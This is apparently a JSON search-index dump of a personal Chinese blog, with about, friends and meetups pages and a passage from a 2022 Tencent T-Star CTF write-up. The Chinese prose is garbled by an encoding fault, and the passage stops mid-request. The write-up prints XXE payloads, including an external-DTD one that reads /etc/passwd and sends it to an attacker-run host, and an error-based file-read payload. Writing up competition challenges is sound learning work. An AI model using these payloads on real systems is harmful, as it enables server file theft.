{"meta":{"title":"MiaoTony'så°çª","subtitle":"å–µå–µå–µ~","description":"å–µ~æ¬¢è¿å„ä½å¤§ä½¬çš„æ¥è®¿å‘€ï¼","author":"MiaoTony","url":"https://miaotony.xyz","root":"/"},"pages":[{"title":"categories","text":"","path":"categories/index.html"},{"title":"contact","text":"","path":"contact/index.html"},{"title":"tags","text":"","path":"tags/index.html"},{"title":"about","text":"Blog çš„å‰ä¸–ä»Šç”Ÿæ ¹æ® About é¡µé¢çš„ç”Ÿæˆæ—¶é—´ï¼ŒMiaoTonyâ€™s Blog æ­å»ºäº 2019 å¹´ 11 æœˆ 27 æ—¥æ™šä¸Šï¼Œé¦–æ¬¡éƒ¨ç½²äº 28 æ—¥å‡Œæ™¨ã€‚ åœ¨æ­¤ä¹‹å‰ï¼Œå°è¯•è¿‡å¾®ä¿¡å…¬ä¼—å·ã€CSDN åšå®¢ä¹‹ç±»çš„ï¼Œå†ä¹‹å‰çš„è¯è‡ªå·±ä¹Ÿå»ºè¿‡åšå®¢/è®ºå›ï¼Œä¸è¿‡ç”±äºå¹´ä»½ä¹…è¿œåŸºæœ¬å°± 404 æˆ–è€…æ‰¾ä¸åˆ°äº† 233ã€‚ å¾®ä¿¡å…¬ä¼—å·çš„è¯ï¼Œä¸»è¦æ²¡å¤šå°‘äººå…³æ³¨ï¼Œå†™æ–‡ç« ä¹Ÿä¸æ–¹ä¾¿ï¼Œä¸èƒ½åŠ å¤–é“¾ï¼Œæ¨é€å‡ºå»å°±ä¸èƒ½éšæ„ä¿®æ”¹ï¼Œä¸åŠ ç¾åŒ–çš„è¯ç•Œé¢è¿˜ä¸‘ä¸‘çš„ï¼Œäºæ˜¯æ¸æ¸å°±ä¸æ€ä¹ˆæ›´æ–°äº†ã€‚ï¼ˆå…¶å®æœ¬æ¥ä¹Ÿæ²¡å‘è¿‡å‡ ç¯‡ï¼‰ CSDN åšå®¢çš„è¯ï¼Œå¹³å°ä¸Šæœ‰å¾ˆå¤šå¤§ä½¬ä¸€èµ·åˆ†äº«è‡ªå·±çš„ç»éªŒå’Œè§è§£ï¼Œä¸ªæ€§æ¨èåšçš„ä¸é”™ï¼Œé˜…è¯»é‡ç¨å¾®å¤šäº†ä¸€ç‚¹ç‚¹ç‚¹ç‚¹ï¼Œä½†æ¯æ¬¡å‘è¡¨æ–‡ç« éƒ½éœ€è¦å®¡æ ¸ï¼Œä¿®æ”¹çš„è¯ä¹Ÿéœ€è¦å®¡æ ¸ï¼Œå›¾ç‰‡ä¹Ÿéœ€è¦ä¸€å¼ å¼ ä¸Šä¼ â€¦â€¦æ„Ÿè§‰ä¸å¤§æ–¹ä¾¿å§ã€‚ è¯´åˆ°å»ºç«™çš„åˆè¡·å˜›ï¼Œè€ƒè™‘åˆ°å¶å°”ä¼šæŠ˜è…¾ç‚¹å°ç©æ„å„¿ï¼Œè€Œä¸”æŠ˜è…¾äº†è€åŠå¤©çš„ä¸œè¥¿å¾ˆå¯èƒ½è¿‡äº†ä¸€æ®µæ—¶é—´å°±ä¸è®°å¾—äº†ï¼Œè¿™æ—¶åˆå¾—å›å»åˆ°å¤„æ‰¾èµ„æ–™ï¼Œå°±è§‰å¾—å¾ˆçƒ¦ä½†åˆå¾ˆæ— å¥ˆã€‚ï¼ˆæ‘Šæ‰‹ï¼‰äºæ˜¯å°±æƒ³æ‰¾ä¸ªåœ°æ–¹è®°å½•ä¸€ä¸‹ã€‚ å¦å¤–ï¼Œé‚£æ—¶çœ‹åˆ°äº† Milkiceâ€™s Iceboxï¼Œè§‰å¾—è‡ªå·±å»ºåšå®¢æŒºæœ‰æ„æ€çš„ï¼Œåé¢åˆçœ‹åˆ°äº† A2OS ä¸Šä¸€å †å¤§ä½¬çš„åšå®¢â€¦â€¦ åŸºäºä»¥ä¸Šç§ç§åŸå› ï¼Œå°±æƒ³æŠ˜è…¾ä¸€ä¸‹ï¼Œè‡ªå·±å»ºä¸€ä¸ªåšå®¢å§ã€‚ æ­£å¥½é‚£æ—¶å€™çš„å‰ä¸ä¹…æ‰“äº†ç¬¬ä¸€æ¬¡ CTFï¼Œæƒ³æŠŠéšæ‰‹å†™çš„ WriteUp å‘å‡ºæ¥ï¼ˆè¿™ä¸€ç¯‡ï¼‰ã€‚åæ¥æœ‰æ¬¡æ¥äº†å…´è¶£ï¼Œåˆ†æäº†ä¸€ä¸‹QQå°ç¨‹åºã€å¹´ç»ˆæŠ¥å‘Šå•/2019å¹´ç»ˆæ€»ç»“ã€‘ï¼Œæ­£å¥½ä¹Ÿéœ€è¦ä¸€ä¸ªæ¯”è¾ƒæ–¹ä¾¿è®°å½•çš„åœ°æ–¹ï¼ˆä¹Ÿå°±æ˜¯è¿™ä¸€ç¯‡ï¼‰ã€‚ æ‡’+æ‹–å»¶äº†å¥½ä¹…ä¹‹åï¼ŒMiaoTonyâ€™s Blog ç»ˆäºé€æ¸æ­å»ºèµ·æ¥äº†ï¼ åšå®¢å»ºç€å»ºç€ï¼Œæ„Ÿè§‰å…³äºé¡µé¢è¿˜ç¼ºç‚¹å•¥ï¼Œä½†ä¸€ç›´æ‹–ç€æ²¡å†™â€¦â€¦ è¿™æ¬¡æ¥è¡¥ä¸Šäº†ï¼ ï¼ˆ20200318ï¼‰ TODO å®Œå–„ RSS è®¢é˜… ï¼ˆRSS é“¾æ¥ï¼šhttps://miaotony.xyz/atom.xml ä¿®æ”¹æ¨¡æ¿ï¼Œå®Œå–„ About é¡µé¢ ï¼ˆå°±æ˜¯è¿™ä¸ªé¡µé¢äº† å†™ä¸ª Blog Contents/Archives é¡¹ç›®éƒ¨ç½²åˆ° GitHub ä¸Š ï¼ˆåœ¨è¿™é‡Œï¼š BlogArchives é‚®ç®±è®¢é˜…ï¼Œè‡ªåŠ¨æ¨é€æ–‡ç«  ï¼ˆå¿«æˆ³ è¿™é‡Œ æ¥è®¢é˜…å–µ~ Telegram Channel æ¨é€ ï¼ˆä¸æ‰“ç®—è‡ªåŠ¨æ¨äº†ï¼Œè¿˜æ˜¯è‡ªå·±å‘æ„Ÿè§‰æ›´å‹å¥½ä¸€ç‚¹å–µ~ æ•´ä¸€ä¸ª é¢åŸº Meetups é¡µé¢ ï¼ˆå˜¿å˜¿ï¼Œå†™å¥½äº†ï¼Œæ”¾åœ¨ /meetups ä¸‹äº†å–µ~ å‹é“¾é¡µé¢ä¸Šçš„é“¾æ¥éšæœºæ’åˆ— æ–‡ç« éšæœºæ¨è Timeline 20220428ï¼šä¿®æ”¹äº†å‹é“¾é¡µé¢çš„æ¨¡æ¿ï¼Œå°†å›å½’è™šæ— ï¼ˆå¤±æ•ˆï¼‰çš„å‹é“¾å•ç‹¬æ”¾åœ¨åé¢äº†ã€‚ 20220221ï¼šå…³äºé¡µé¢èµåŠ©å¤„æ–°å¢äº†å‡ å®¶ VPS å‚å•†ï¼ˆå³å¸¦ aff çš„è´­ä¹°å…¥å£ï¼‰ï¼Œå¿«æ¥ç»™å–µå–µåŠ é¤å§ï¼ 20211216ï¼šå‡çº§äº† Font-Awesomeã€tocbotã€lightGallery ç­‰ä¸€äº›æ’ä»¶çš„ç‰ˆæœ¬ï¼Œåˆå¹¶äº† Matery ä¸»é¢˜çš„éƒ¨åˆ†æ›´æ–°ï¼Œä¼˜åŒ–äº†æœç´¢æ¡†ï¼Œä¿®å¤äº†ä»£ç å—å¤åˆ¶æ—¶ç”±äºæ·»åŠ ç‰ˆæƒä¿¡æ¯è€Œå¯¼è‡´ä»£ç ç©ºç™½å­—ç¬¦æ¶ˆå¤±çš„ bug ç­‰ã€‚ 20210205ï¼šå°†åšå®¢ç‰ˆæœ¬ç”± hexo 4.0.0 å‡çº§åˆ°äº†ç›®å‰æœ€æ–°çš„ 5.3.0ï¼ŒåŒæ—¶åˆå¹¶äº† Matery ä¸»é¢˜çš„å¤§éƒ¨åˆ†æ›´æ–°ã€‚ï¼ˆå–µå‘œï¼Œå‰ç«¯æ›´æ–°æ¢ä»£çœŸå¿«ï¼‰ 20210128ï¼šç»™ About é¡µé¢åŠ ä¸Šäº† Sponsorshipï¼Œæ¬¢è¿ buy me a cup of coffee~ 20201216ï¼šæ–°å¢ é¢åŸº Meetups é¡µé¢ï¼Œè¯¦è§ /meetupsã€‚ï¼ˆåˆä¸€ä¸ª TODO getâˆšï¼‰ 20200729ï¼šæ–°å¢ é‚®ç®±è®¢é˜…ï¼ŒåŸºäº RSS å’Œ mailchimp æ¥å®ç°ã€‚åœ¨è¿™é‡Œ æäº¤ä½ çš„é‚®ç®±ä¹‹åï¼Œæœ‰æ–°æ–‡ç« å°±ä¼šè‡ªåŠ¨ç»™ä½ çš„é‚®ç®±å‘é‚®ä»¶æ¨é€å•¦ï¼ï¼ˆåˆä¸€ä¸ª TODO getâˆšï¼‰ 20200411ï¼šç”±äº safari ä¸æ”¯æŒ .webpï¼Œæ”¹ä¸ºç”¨ tinypng æ¥å‹ç¼©èƒŒæ™¯å›¾ç‰‡äº†ã€‚ 20200410ï¼šå‹ç¼©èƒŒæ™¯å›¾ç‰‡ å¹¶è½¬æ¢ä¸º .webp æ ¼å¼ ï¼Œä¼˜åŒ–åŠ è½½é€Ÿåº¦ã€‚ 20200320ï¼šæŠ˜è…¾äº†ä¸€ä¸‹ï¼Œå¼€å‘äº†ä¸€ä¸ªåšå®¢æ–‡ç« å½’æ¡£çš„ é¡¹ç›® BlogArchivesï¼ŒåŸºäº GitHub Action å®šæœŸé€šè¿‡ RSS æ›´æ–°ï¼Œç”Ÿæˆæ–‡ç« åˆ—è¡¨ã€‚ ï¼ˆåç»­æ‰“ç®—åŸºäºè¿™ä¸ªå®ç° Telegram Channel æ¨é€å‘¢ï¼ 20200318ï¼šç»ˆäºæ¥å®Œå–„ About é¡µé¢ï¼ˆå°±æ˜¯è¿™ä¸ªé¡µé¢ï¼‰äº†ã€‚ 20200314ï¼šè®© JavaScriptã€CSSã€ä¸€äº›èƒŒæ™¯å›¾ç‰‡èµ° jsdelivr çš„ cdnï¼Œä¼˜åŒ–ç½‘ç«™åŠ è½½é€Ÿåº¦ã€‚ ä¿®æ”¹äº† hexo çš„ feed æ’ä»¶ï¼ŒæŠŠ RSS ä¸­çš„ summary ä¼˜åŒ–ä¸ºäº†æ–‡ç« çš„æ‘˜è¦ï¼Œæ”¹å–„äº†è®¢é˜…ä½“éªŒã€‚ï¼ˆRSS åœ°å€ï¼šhttps://miaotony.xyz/atom.xml ï¼‰ 20200207ï¼šå‡çº§ Gitalk è¯„è®ºæ’ä»¶ä»¥è§£å†³ Email Bombsï¼Œè¯¦è§è¿™é‡Œã€‚ 20200123ï¼šåŠ å…¥ä¸€ä¸ªç½‘é¡µ title ç‰¹æ•ˆã€‚ ç¦»å¼€é¡µé¢åæ ‡é¢˜æ˜¾ç¤ºä¸º è¿”å›é¡µé¢æç¤º 20200120ï¼šç»‘å®šäº† miaotony.xyz åŸŸåã€‚ 20191207ï¼šæ–°å¢ Gitalk è¯„è®ºç³»ç»Ÿã€‚ 20191206ï¼šæ›´æ¢ä¸º Matery ä¸»é¢˜ã€‚ 201912XXï¼šé™†ç»­æ¬è¿äº†ä¹‹å‰å†™çš„å‡ ç¯‡æ–‡ç« åˆ°åšå®¢ä¸Šã€‚ 20191202ï¼šæ›´æ¢ä¸º cube ä¸»é¢˜ã€‚æ¬è¿äº†ä¹‹å‰å†™çš„ CTF WriteUp å¹¶è¿›ä¸€æ­¥å®Œå–„ã€‚ 20191128ï¼šHello Worldï¼æœ¬ç«™åˆæ¬¡æ­å»ºï¼ŒåŸºäº Hexoï¼Œéƒ¨ç½²åœ¨ GitHub Pages ä¸Šã€‚ç”¨çš„æ˜¯é»˜è®¤ä¸»é¢˜ã€‚ 201907XX ï¼šå°è¯•åœ¨ CSDN åšå®¢ä¸Šå‘è¡¨æ–‡ç« ã€‚ç¬¬ä¸€ç¯‡æ¬åˆ°è¿™é‡Œäº†ã€‚ 2018ä¸è®°å¾—ä»€ä¹ˆæ—¶å€™ï¼šç”³è¯·äº†ä¸€ä¸ªå¾®ä¿¡å…¬ä¼—å·ï¼Œéšæ‰‹æ¨ç‚¹ä¸œè¥¿ã€‚ï¼ˆä¸è¿‡çœŸæ²¡å•¥ä¸œè¥¿ï¼‰ ContactGitHub: https://github.com/miaotony æ¬¢è¿æ¥ follow å‘€ï¼ Telegram: Just PM @meow_portal_bot Telegram Channel: @MiaoTonyChannel Email: bWlhb3RvbnlAb3V0bG9vay5jb20= | b64decode æ¬¢è¿å¤§ä½¬ä»¬æ¥å’Œæˆ‘äº¤æ¢å‹é“¾å‘€~ ç•™è¨€è¯·ç§»æ­¥åˆ°ç•™è¨€æ¿ï¼Œè°¢è°¢ã€‚ Sponsorshipè¯·ç»™æˆ‘é’± ç»™å–µå–µåŠ ä¸ªé¤å§ï¼ Buy me a cup of coffee~ WeChat: çˆ±å‘ç”µ afdian: https://afdian.net/@miaotony Some VPS Hosting with aff: BuyVM VirMach Tencent è…¾è®¯äº‘ ï¼ˆæ–°å®¢ä¸“å±ç¦åˆ©ï¼‰ Aliyun é˜¿é‡Œäº‘ ï¼ˆæ–°äººç‰¹æƒ ä¸“äº«ï¼‰ Last Modified Time: 2022-04-28","path":"about/index.html"},{"title":"404","text":"","path":"404.html"},{"title":"friends","text":"æœ¬ç«™ä¿¡æ¯åå­—ï¼š MiaoTonyâ€™s å°çª é“¾æ¥ï¼š https://miaotony.xyz/ å¤´åƒï¼š https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/medias/avatar.jpg bannerï¼š https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/medias/banner.jpg ç®€ä»‹ï¼š ä»°æœ›æ˜Ÿç©ºï¼Œè„šè¸å®åœ°ï¼Œæœªæ¥å¯æœŸ æ¬¢è¿å„ä½å¤§ä½¬æ¥äº¤æ¢å‹é“¾å‘€~è¯·å¤§ä½¬ç•™ä¸‹é“¾æ¥ã€å¤´åƒã€ä¸€å¥è¯ç®€ä»‹ã€è”ç³»æ–¹å¼æˆ–è€…ç§æˆ³æˆ‘ä¹Ÿè¡Œå•¦ã€‚å½“ç„¶ä¹Ÿå¯ä»¥é‚®ç®±è”ç³»: bWlhb3RvbnlAb3V0bG9vay5jb20= (base64 æ‡‚çš„éƒ½æ‡‚ å˜¿å˜¿å˜¿ ä¸€ç‚¹å°è¦æ±‚ å‰æè‡³å°‘æ˜¯æˆ‘ä»¬è®¤è¯†8 ï¼ˆä¸è®¤è¯†çš„è¯å’Œæˆ‘ py äº¤æµä¸€ä¸‹å°±å¥½äº†å–µ è¿™è¾¹å»ºè®®å…ˆåŠ ä¸Šæœ¬ç«™å‹é“¾å–µ~ æœ€å¥½ä¿è¯ä¸€ä¸‹è´¨é‡ï¼Œè‡³å°‘èƒ½è¾ƒé•¿æ—¶é—´ç»´æŠ¤ä¸‹å»å§~ è¿˜æœ‰ï¼Œè®°å¾—ä¸Š HTTPS å‘¢ï¼","path":"friends/index.html"},{"title":"Meetups","text":"2020-11-15@ Nanjing Presidential Palace (during ISCAS ISRC Summer 2020 Summit Meeting) With Zenithal, Billchenchina, TechCiel, Hearn, ksyx, ğ“Ÿğ“¾ğ“½ğ“²ğ“·ğ“¼ğ“¹ğ“¾ğ“­ğ“­ğ“²ğ“·ğ“° (Putinspudding) @ Suning (nearby), Nanjing With Zenithal, TechCiel, XYenon 2020-12-05@ NUAA, Nanjing With NBSwSweet With Milkice, Hearn 2020-12-06@ Shenzhen (during X-NUCA 2020) With NanoApe, Nohn 2020-12-17@ Chuji roast duck, Nanjing With Raphael Wired 2021-01-01@ Xinjiekou, Nanjing With Michael Zhu (Apoi), ğ“Ÿğ“¾ğ“½ğ“²ğ“·ğ“¼ğ“¹ğ“¾ğ“­ğ“­ğ“²ğ“·ğ“° (Putinspudding), Hearn, XYenon 2021-02-23@ Maâ€²anshan With ksyx 2021-04-03@ Xinjiekou, Nanjing With Nohn, Milkice, ğ“Ÿğ“¾ğ“½ğ“²ğ“·ğ“¼ğ“¹ğ“¾ğ“­ğ“­ğ“²ğ“·ğ“° (Putinspudding), Hearn, XYenon 2021-04-30@ Baijiahu, Nanjing With NanoApe, Milkice, Zinc Quartz, ZegWe 2021-05-03@ Xianlin, Nanjing With fruitymelon, Hearn, ğ“Ÿğ“¾ğ“½ğ“²ğ“·ğ“¼ğ“¹ğ“¾ğ“­ğ“­ğ“²ğ“·ğ“° (Putinspudding) 2021-07-12@ Zhengzhou (during Qiangwangbei S5) With NanoApe, Papersnake, FantasqueX, dylanyryang, w00d, wulipulala 2021-07-25@ Guangzhou With batkiz, Nohn, ç¥æ¥½å‚ ã‚²ã‚¤ã‚·ãƒ£ (kgrzkgeisha) 2021-08-28@ Shanghai With EsonHugh_Skywalker 2021-09-11@ Shanghai With Seiry Yu, PMExtra, qrzbing, Milkice 2021-09-20@ Shanghai With Micheal (Abinitio_ren_xia_ren), EstelağŸ“ Xi, Michael Zhu, W A, Marcythm, â˜„ï¸ LightQuantum, fruitymelon 2021-10-05@ Shanghai With Alex Chi, luyanaa, TomQunChao 2021-11-21@ Shanghai With Methionine Lee, Aisina (LovelyWei) 2022-01-22@ Guangzhou With ç¥æ¥½å‚ ã‚²ã‚¤ã‚·ãƒ£ (@kgrzkgeisha), batkiz, æ¸¡è¾º åºƒäºº, Alex Hsieh, Jeffery Young 2022-01-23@ Beijing Rd, Guangzhou With è«æ–¯å¥‡å¤š (@hulotte) 2022-02-24@ JAcafe, Shanghai (SHLUG Hacking Thursday Night) With cubercsl, fcitx5, å‚å€‰Â·QRTÂ·ã¾ã¤ã‚Š(@matsuri_sakakura), etc. Meow~ To be continuedâ€¦","path":"meetups/index.html"}],"posts":[{"title":"CTF | 2022 æœªçŸ¥ä¹‹å¢ƒ è…¾è®¯ç½‘ç»œå®‰å…¨T-Staré«˜æ ¡æŒ‘æˆ˜èµ› WriteUp","text":"æœ¬æ–‡é¦–å‘äºè·³è·³ç³–ï¼šhttps://tttang.com/archive/1577/ å¼•è¨€ Into the Unknownï½œè…¾è®¯ç½‘ç»œå®‰å…¨T-Staré«˜æ ¡æŒ‘æˆ˜èµ› ä¸»åŠæ–¹ï¼šè…¾è®¯å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ(TSRC) æ¯”èµ›æ—¶é—´ï¼š04/20 10:00 ~ 04/24 18:00 æ‹›å‹Ÿå¯¹è±¡ å…¨æ—¥åˆ¶åœ¨è¯»å¤§å­¦ç”Ÿï¼ˆåŒ…æ‹¬ä¸“ç§‘é™¢æ ¡ã€ç¡•åšå­¦ç”Ÿï¼Œå¹´çº§ã€ä¸“ä¸šã€åœ°åŒºä¸é™ï¼‰ æ— è®ºä½ æ˜¯å®‰å…¨ä¸“ä¸šå­¦ç”Ÿï¼Œè¿˜æ˜¯è§£å¯†æ¸¸æˆçˆ±å¥½è€…ï¼Œéƒ½å¯ä»¥åœ¨è¿™é‡Œå¤§å±•èº«æ‰‹ï¼ æ’åè§„åˆ™ ä¸ªäººæŠ¥åå‚èµ›ï¼Œåœ¨çº¿ç ´è§£ æ¯”èµ›å…±6é¢˜ï¼Œåˆ†å€¼åˆ†åˆ«ä¸º100ã€100ã€200ã€200ã€300ã€300ï¼Œæ’è¡Œæ¦œæ»¡åˆ†ä¸º1200åˆ† æ’åé€»è¾‘ æ€»åˆ†ä¸åŒï¼Œåˆ†æ•°é«˜ï¼åˆ†æ•°ä½ã€‚ æ€»åˆ†ç›¸åŒï¼Œæ—¶é—´ä¼˜å…ˆã€‚å³ï¼Œæ ¹æ®æ‰€ç­”æœ€åä¸€é¢˜æ—¶é—´å…ˆåï¼Œå…ˆç­”é¢˜è€…æ’åæ›´é«˜ã€‚ https://cloud.tencent.com/developer/competition/introduction/10042 è¯´èµ·æ¥æŒºæ—©å°±çœ‹åˆ°äº†è¿™ä¸ªæ¯”èµ›ï¼Œåæ¥æ¯”èµ›å¼€å§‹ç¾¤å‹åˆåœ¨ç¾¤é‡Œæ¨äº†ä¸€ä¸‹ï¼Œä¸è¿‡ç¬¬ä¸€å¤©å–µå–µä»æ—©åˆ°æ™šä¸Šäº†ä¸€å¤©è¯¾ï¼Œæ·±å¤œæ‰æ¥ç„äº†ä¸€ä¸‹é¢˜ç›®ã€‚ æ€»ä½“è€Œè¨€æ•´ä¸ªé¢˜ç›®æœ‰ç‚¹åƒä¸ªå‰§æƒ…ï¼Œç±»å‹åå‘ Misc å’Œ Webï¼Œæ­£å¥½å°±åˆå–µå–µèƒƒå£äº†ã€‚ç”±äºæœ‰çš„é¢˜ç›®è„‘æ´æœ‰ç‚¹å¤§ï¼Œå†åŠ ä¸Šåé¢è¿˜æœ‰è¯¾ä»¥åŠå…¶ä»–äº‹æƒ…ï¼Œä¸€èˆ¬æ˜¯åŠå¤œåœ¨çœ‹é¢˜ï¼Œä»¥è‡³äºæƒ³ä¸é€šæ€ä¹ˆåšæŒºéš¾å—çš„ç¡ä¸ç€ï¼Œç›´åˆ°22å·ä¸‹åˆæ‰æŠŠæ‰€æœ‰é¢˜ç›® AKï¼Œæœ€åæ’åç¬¬17ã€‚ å”‰ï¼Œçœ‹äº†çœ‹æ¦œé¦–çš„ ha1c9onã€Yoshino-s ç­‰å¤§å¸ˆå‚…éƒ½æŒºç†Ÿæ‚‰äº†ï¼Œä»–ä»¬ç¬¬ä¸€å¤©æ™šä¸Šå°± AK äº† Orzï¼Œå–µå–µè¿˜æ˜¯å¤ªèœäº†ã€‚ é‚£ä¸‹é¢å°±æ¥è®°å½•ä¸€ä¸‹è§£é¢˜çš„è¿‡ç¨‹å§ï¼Œå¤§éƒ¨åˆ†è¾¹åšè¾¹å†™çš„ï¼Œå¯èƒ½åŒ…å«ä¸€äº›è¯¯å¯¼æ€§çš„å†…å®¹ï¼Œå¸Œæœ›å„ä½å¸ˆå‚…ä¸è¦åœ¨æ„ã€‚ banner çš„æµ·æŠ¥é‡Œå±…ç„¶è¯´â€œæœ€æœ‰è¶£â€ï¼Œå¹¿å‘Šæ³•è­¦å‘Šï¼ˆå°å£°bb èµ›é¢˜ä¸€ æœªçŸ¥ä¹‹å¢ƒ Into the Unknownâ€¦â€¦æœªçŸ¥ä¹‹å¢ƒâ€¦â€¦ ä½ çœ‹ç€å±å¹•ä¸Šçš„æ–‡å­—ï¼Œé™·å…¥äº†æ²‰æ€ã€‚åŠ å¯†ä½ çš„æ–‡ä»¶ï¼Œè¿˜æ‹ä¸‹äº†ä½ çš„ä¸€ä¸¾ä¸€åŠ¨â€¦â€¦ä¸ç®¡è¿™ä¸ªäººæ˜¯è°ï¼Œä»–éƒ½æ˜¯è“„è°‹å·²ä¹…ã€‚ é‚£ä¹ˆï¼Œæ˜¯ä¸æ˜¯åº”è¯¥æ‹’ç»ï¼Ÿå¯äººç”Ÿçš„å¦ä¸€ç§å¯èƒ½â€¦â€¦å¸¦é¢†ä½ èµ°å‘æœªçŸ¥â€¦â€¦ä¸€è‚¡ç†Ÿæ‚‰çš„èºåŠ¨åœ¨æŒ‡å°–ä¼ æ¥ï¼Œä¸ç®¡è¿™ä¸ªè®¾ä¸‹åœˆå¥—çš„äººæ˜¯è°ï¼Œä»–ä¸€å®šéƒ½å¯¹ä½ æä¸ºäº†è§£ï¼šä»–çŸ¥é“ä½ ä¸ä¼šè½»æ˜“æ”¾å¼ƒï¼Œä½ çŸ¥é“ä½ ä¼šæ¥å—æŒ‘æˆ˜ã€‚ è¿™æ˜¯ä½œä¸ºä¸€ä¸ªä¼˜ç§€çš„é»‘å®¢ï¼Œå¿…ä¸å¯å°‘çš„å“è´¨ã€‚ ä½ ç‚¹å¼€äº†è¿™ä¸ªç¥ç§˜çš„ç½‘ç«™ã€‚ http://175.178.148.197:5000/ è¿™â€¦â€¦ä¼¼ä¹éœ€è¦ä½ å®Œæˆæ‰‹æœºå·éªŒè¯æ‰èƒ½ç™»é™†ã€‚è¿›åˆ°è¿™ä¸ªç½‘ç«™åå°ï¼Œæ˜¯å¦æœ‰æ›´å¤šæ¶ˆæ¯ï¼Ÿ æç¤ºï¼šwebé¢˜ï¼Œflagä¸ºT-Star{å­—ç¬¦ä¸²}ä¸­çš„å­—ç¬¦ä¸²ï¼Œä¸¥ç¦ä½¿ç”¨æ‰«æå™¨è¿›è¡Œè·¯å¾„/éªŒè¯ç æš´åŠ›ç ´è§£ï¼Œæ­¤æ“ä½œå¯¹è§£é¢˜æ²¡æœ‰å¸®åŠ©å¹¶å°†å¯¹æ¶æ„æ‰«æIPè¿›è¡Œå°ç¦ã€‚ ç™»å½•ç•Œé¢ï¼Œæ‰‹æœºéªŒè¯ç ç‚¹å‡»å‘é€ï¼Œè¿”å›é‡Œçš„ debug å°±å¸¦æœ‰éªŒè¯ç ï¼Œè¾“å…¥å³å¯é€šè¿‡ç™»å½•éªŒè¯ã€‚ è¿›æ¥ä¹‹åçœ‹ä¸Šå»æ˜¯ä¸ªç›´æ’­é—´ï¼Œä½†é‡Œé¢å…¶å®éƒ½æ˜¯æ’­æ”¾çš„è§†é¢‘ã€‚ åç«¯æ˜¯ gunicornï¼Œå‰ç«¯æ˜¯ react + webpack æ‰“åŒ…çš„ï¼Œæ²¡å¼€ source mapã€‚ çœ‹äº†è€åŠå¤©å‰ç«¯æ‚ä¹±çš„ jsï¼Œæ„Ÿè§‰ä¹Ÿæ²¡å‡ ä¸ª apiã€‚ /api/info?id=1 éå†äº† id ä¹Ÿå°±ä¸‰ä¸ªå¥½åƒï¼Œæ²¡å•¥æœ‰æ„æ€çš„å‘ç°ï¼Œä¹Ÿæ²¡è¯•å‡ºæ¥ sql æ³¨å…¥ã€‚ ç‚¹èµæ¥å£æ¯”è¾ƒå¯ç–‘ã€‚ POST /api/like HTTP/1.1 Host: 175.178.148.197:5000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/json Content-Length: 10 Origin: http://175.178.148.197:5000 Connection: keep-alive Referer: http://175.178.148.197:5000/ Cookie: session=eyJsb2dpbiI6dHJ1ZX0.YmEloQ.HoKxH0jZ72zQK_jLKiYUMt8ZIBw Pragma: no-cache Cache-Control: no-cache {\"id\":\"1\"} response: {\"status\": true, \"data\": {\"count\": 891}} è¯•äº†ä¸‹æ³¨å…¥ï¼Œæ²¡å•¥ç”¨ã€‚ {\"status\": true, \"data\": {\"count\": \"No such streamer.\"}} å…¶ä»–çš„æ¥å£ä¹Ÿå°±ç™»å½•ã€smscodeï¼Œæ„Ÿè§‰ä¹Ÿæ²¡å•¥ç”¨ï¼Œå””ã€‚äºæ˜¯å¡äº†å¥½ä¹…ã€‚ æœ€åå‘ç°å±…ç„¶èƒ½ä¼  xmlã€‚ã€‚ POST data é‡Œéšæ„è¾“å…¥é JSON å­—ç¬¦ä¸²ï¼Œè¿”å› {\"ERROR\": \"No JSON object could be decoded\"} é‚£è¯•è¯•èƒ½ä¸èƒ½è§£æ xmlï¼Ÿ æ”¹ Content-Type ä¸º application/xmlï¼Œç„¶åæ„é€  XXE payloadã€‚ è¯•äº†ä¸‹ä¸èƒ½å›æ˜¾ï¼Œå¾—å¤–å¸¦ï¼ˆ VPS ä¸Šèµ·ä¸ª server æ”¾ä¸ª test.dtd &lt;!ENTITY % file SYSTEM \"file:///etc/passwd\"&gt; &lt;!ENTITY % int \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://vpsip:port/?p=%file;'&gt;\"&gt; payloadï¼š &lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM \"http://vpsip/test.dtd\"&gt; %remote;%int;%send; ]&gt; ç„¶è€Œå‘ç° å¤–å¸¦å¸¦ä¸å‡ºæ¥ã€‚ã€‚æ•´äº†ä¸ª dnslog çœ‹äº†ä¹Ÿæ²¡ dns è§£æè®°å½•ã€‚ é‚£æ•´ä¸ªæŠ¥é”™è¾“å‡ºå§ã€‚ã€‚ &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % x SYSTEM \"file:///etc/passwd\"&gt; &lt;!ENTITY % y ' &lt;!ENTITY &amp;#x25; z \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;&amp;#x25;x;&amp;#x27;&gt;\"&gt; &amp;#x25;z; '&gt; %y; ]&gt; &lt;message&gt;233&lt;/message&gt; å¯ä»¥è¯»æ–‡ä»¶ï¼Œé‚£ flag åœ¨å“ªå‘¢ï¼Ÿ å‘ç°è¯»ä¸äº† /proc/self/environï¼Œå› ä¸º 0x00 ä¸èƒ½è§£æã€‚ï¼ˆChar 0x0 out of allowed rangeï¼‰ é‚£ç›´æ¥ç”¨ cwd è¯» app.py å§ã€‚ å¯æƒœé‡åˆ°å¼•å·è¢«æˆªæ–­äº†ï¼Œå¯æ˜¯ python ä¸åƒ PHP å¯ä»¥ç”¨ä¼ªåè®®è¿›è¡Œä¸€äº›ç¼–ç ï¼Œä¸æ‡‚ python èƒ½ä¸èƒ½ç¼–ç ä¸€ä¸‹ã€‚ã€‚å¸Œæœ›æœ‰å¤§å¸ˆå‚…å¸¦å¸¦å–µå–µã€‚ æ¥ä¸‹æ¥è¯»ä¸€ä¸‹ config.pyã€‚ POST /api/like HTTP/1.1 Host: 175.178.148.197:5000 Content-Length: 272 Accept: application/xml User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Content-Type: application/xml Origin: http://175.178.148.197:5000 Referer: http://175.178.148.197:5000/ Accept-Encoding: gzip, 